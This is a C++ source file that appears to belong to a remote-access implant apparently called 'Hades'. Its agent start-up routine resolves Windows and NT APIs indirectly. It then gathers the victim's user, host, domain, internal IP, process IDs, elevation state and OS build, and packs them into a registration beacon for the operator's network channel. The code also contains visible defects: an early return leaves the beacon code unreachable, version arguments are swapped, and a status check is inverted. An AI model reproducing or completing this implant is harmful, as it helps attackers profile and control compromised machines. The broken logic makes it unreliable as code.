#include <WS2tcpip.h>
#include <stdio.h>
#include <iphlpapi.h>
#include "../shared/common.hpp"
#include "../utils/apidefs.hpp"
#include "../utils/bytes.hpp"
#include "../shared/nt.hpp"
#include "../networkd/network.hpp"
#include "../hades/hades.h"
#include "config.hpp"


#define MSG_REGISTER 1

BOOL GetVer(DWORD* major, DWORD* minor, DWORD* build) {
	hades->NtApis.RtlGetNtVersionNumbers(major, minor, build);
		
	return TRUE;
}


ULONG GenID() {
	ULONG S = hades->WinApis.GetTickCount();
	ULONG id = hades->NtApis.RtlRandomEx(&S);
	return id;
}


PBYTE CollectProcessPath(DWORD* out) {
	PBYTE buffer = AllocMemory<BYTE>(32767);

	DWORD Len = hades->WinApis.GetModuleFileNameA(NULL, (PCHAR)buffer, 32767);
	*out = Len;
	return buffer;


}


PBYTE CollectUser(DWORD* out) {
	DWORD BufSize = NULL;
	hades->WinApis.GetUserNameA(NULL, &BufSize);
	PBYTE buffer = AllocMemory<BYTE>(BufSize);

	if (!hades->WinApis.GetUserNameA((PCHAR)buffer, &BufSize)) {
		return NULL;
	}
	*out = BufSize;
	return buffer;

}


PBYTE CollectHost(DWORD* out) {
	DWORD BufSize = NULL;
	hades->WinApis.GetComputerNameExA(ComputerNameDnsHostname, NULL, &BufSize);
	PBYTE buffer = AllocMemory<BYTE>(BufSize);

	if (!hades->WinApis.GetComputerNameExA(ComputerNameDnsHostname, (PCHAR)buffer, &BufSize)) {
		return NULL;
	}
	*out = BufSize;
	return buffer;
}


PBYTE CollectDomainName(DWORD* out) {
	DWORD BufSize = NULL;
	hades->WinApis.GetComputerNameExA(ComputerNameDnsDomain, NULL, &BufSize);
	PBYTE buffer = AllocMemory<BYTE>(BufSize);

	if (!hades->WinApis.GetComputerNameExA(ComputerNameDnsDomain, (PCHAR)buffer, &BufSize)) {
		return NULL;
	}
	*out = BufSize;
	return buffer;
}



BOOL IsElevated() {

	HANDLE tok = 0;;
	TOKEN_ELEVATION Elev = { 0 };
	BOOL isElev = FALSE;
	DWORD size = sizeof(TOKEN_ELEVATION);
	NTSTATUS stat = hades->NtApis.NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok);
	if (stat > 0) {
		BOOL check = hades->WinApis.GetTokenInformation(tok, TokenElevation, &Elev, sizeof(Elev), &size);
		if (check) {
			isElev = (BOOL)(Elev.TokenIsElevated != FALSE) ? 1 : 0;
		}
	}
	if (tok) {
		hades->WinApis.CloseHandle(tok);
	}

	return isElev;
}


PBYTE GetInternalIP(DWORD* out) {
	ULONG BufLen = 0;
	PIP_ADAPTER_INFO adapter = NULL;
	PIP_ADAPTER_INFO adapter_info = NULL;
	hades->WinApis.GetAdaptersInfo(NULL, &BufLen);
	adapter_info = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BufLen);
	
	DWORD ret = hades->WinApis.GetAdaptersInfo(adapter_info, &BufLen);
	if (ret != ERROR_SUCCESS) {
		HeapFree(GetProcessHeap(), 0, adapter);
		return NULL;
	}

	PBYTE AddrStr = AllocMemory<BYTE>(16);

	for (adapter = adapter_info; adapter != NULL; adapter = adapter->Next) {
		IP_ADDR_STRING* addr = &adapter->IpAddressList;
		while (addr != NULL) {
			memcpy(AddrStr, addr->IpAddress.String, 16);
			*out = 16;
			return AddrStr;
		}
	}
	return NULL;
}


ULONG GetPPID() {
	PROCESS_BASIC_INFORMATION pBI = { 0 };
	ULONG RetLen = 0;

	NTSTATUS Stat = hades->NtApis.NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pBI, sizeof(pBI), &RetLen);
	return (ULONGLONG)(ULONG_PTR)pBI.InheritedFromUniqueProcessId;

}


BOOL InitAgent() {
	
	hades      = AllocMemory<Hades>(sizeof(Hades));
	g_ByteMgr =  AllocMemory <bytes>    (sizeof(bytes));
	g_Network =  AllocMemory <Network>  (sizeof(Network));
	if (!LoadAPIS()) { return FALSE; }
	if (!LoadConfig()) { return FALSE; }
	return TRUE;
	
	*g_Network = Network();
	





	DWORD UserLen, HostLen, DomainLen, ProcessPathLen, IpLen, Major, Minor, Build;;

	ULONG HadesID     = GenID();
	PBYTE User        = CollectUser         (&UserLen);
	PBYTE Host        = CollectHost         (&HostLen);
	PBYTE ProcessPath = CollectProcessPath  (&ProcessPathLen);
	PBYTE Domain      = CollectDomainName   (&DomainLen);
	PBYTE IpAddr      = GetInternalIP       (&IpLen);
	DWORD TID         = TO_DWORD            (GetTeb()->ClientId.UniqueThread);
	DWORD PID         = TO_DWORD            (GetTeb()->ClientId.UniqueProcess);
	DWORD PPID = GetPPID();
	BOOL Arch         = (sizeof(void*) != 4);
	BOOL IsElev       = IsElevated();
	GetVer(&Minor, &Major, &Build);


	

	/*
		[MSG TYPE]		  4 BYTES
		[HADES ID]		  4 BYTES
		[UserLen]         4 BYTES
		[Username]		  N BYTES
		[HostLen]		  4 BYTES
		[Hostname]		  N BYTES
		[IP LEN]		  4 BYTES
		[IP STR]		  N BYTES
		[ProcessPath Len] 4 BYTES
		[PROCESS PATH]    N BYTES
		[PID]			  4 BYTES
		[TID]			  4 BYTES
		[PPID]			  4 BYTES
		[IsElev]		  1 BYTES
		[Arch]			  1 BYTES
		[Minor]			  4 BYTES
		[Major]			  4 BYTES
		[Build]			  4 BYTES*/
	g_ByteMgr->InitWrite();
	g_ByteMgr->Write4(MSG_REGISTER);
	g_ByteMgr->Write4(HadesID);
	g_ByteMgr->Write4(UserLen);
	g_ByteMgr->WriteString(User, UserLen);
	g_ByteMgr->Write4(HostLen);
	g_ByteMgr->WriteString(Host, HostLen);
	g_ByteMgr->Write4(IpLen);
	g_ByteMgr->WriteString(IpAddr, IpLen);
	g_ByteMgr->Write4(ProcessPathLen);
	g_ByteMgr->WriteString(ProcessPath, ProcessPathLen);
	g_ByteMgr->Write4(PID);
	g_ByteMgr->Write4(TID);
	g_ByteMgr->Write4(PPID);
	g_ByteMgr->Write1(IsElev);
	g_ByteMgr->Write1(Arch);
	g_ByteMgr->Write4(Minor);
	g_ByteMgr->Write4(Major);
	g_ByteMgr->Write4(Build);
	g_Network->RegisterClient(g_ByteMgr->OutData, g_ByteMgr->index);
	




	if (User)        { HeapFree(GetProcessHeap(), 0, User);        }
	if (Host)        { HeapFree(GetProcessHeap(), 0, Host);        }
	if (Domain)      { HeapFree(GetProcessHeap(), 0, Domain);      }
	if (ProcessPath) { HeapFree(GetProcessHeap(), 0, ProcessPath); }
	if (IpAddr)      { HeapFree(GetProcessHeap(), 0, IpAddr);      }
	return TRUE;

}










